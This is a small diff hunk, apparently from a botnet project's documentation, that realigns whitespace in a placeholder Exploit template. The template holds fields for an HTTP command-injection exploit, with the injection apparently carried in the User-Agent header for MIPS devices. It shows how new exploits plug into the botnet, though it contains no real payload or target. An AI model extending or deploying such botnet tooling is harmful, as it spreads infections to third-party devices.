@@ -82,7 +82,7 @@ The exploit that's used in this botnet mostly will be a command injection (TBH i
 		enewCVE1 := Exploit{
 			exploitName:       "CVE_someYear_newCVE1",			# Customize the exploit name for a reporting process.
 			exploitMethod:     "POST",					# Which HTTP method you will use for this exploit?
-			exploitPath:     "example/something",				# Customize URL path.
+			exploitPath:       "example/something",				# Customize URL path.
 			exploitBody:       strings.NewReader(string(newCVE1)),	        # Customize HTTP body.
 			exploitAgent:      "example"+b.inject("mips", true),		# Customize HTTP agent.
 			exploitAccept:     "example",					# Customize HTTP accept.
